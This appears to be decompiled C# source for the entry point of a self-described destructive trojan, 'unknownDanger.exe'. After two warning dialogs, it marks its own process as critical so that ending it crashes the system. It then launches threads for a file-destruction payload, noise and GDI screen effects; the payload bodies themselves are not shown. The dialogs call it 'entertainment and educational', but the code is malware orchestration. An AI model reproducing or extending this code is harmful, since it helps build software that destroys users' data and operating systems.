using System;
using System.Threading;
using System.Windows.Forms;

namespace unknownDanger
{
	// Token: 0x02000007 RID: 7
	internal class mainClass
	{
		// Token: 0x0600008B RID: 139 RVA: 0x0000395E File Offset: 0x00001B5E
		public static void thing()
		{
			new layeredWindow5().ShowDialog();
		}

		// Token: 0x0600008C RID: 140 RVA: 0x0000396C File Offset: 0x00001B6C
		[STAThread]
		private static void Main()
		{
			bool flag = MessageBox.Show("WARNING!\n\nYou have ran a Trojan known as unknownDanger.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", "unknownDanger", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.No;
			if (flag)
			{
				Environment.Exit(267);
			}
			bool flag2 = MessageBox.Show("FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", "unknownDanger", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.No;
			if (flag2)
			{
				Environment.Exit(267);
			}
			Imports.SetProcessCritical(true);
			new Thread(new ThreadStart(Payloads.filedestroy)).Start();
			new Thread(new ThreadStart(Audio.noise)).Start();
			new Thread(new ThreadStart(Payloads.gdi1)).Start();
			Thread.Sleep(4000);
			new Thread(new ThreadStart(Payloads.gdi2)).Start();
			Thread.Sleep(4000);
			new Thread(new ThreadStart(Payloads.gdi3)).Start();
			Thread.Sleep(4000);
			new Thread(new ThreadStart(Payloads.gdi4)).Start();
			Thread.Sleep(4000);
			new Thread(new ThreadStart(mainClass.thing)).Start();
		}
	}
}
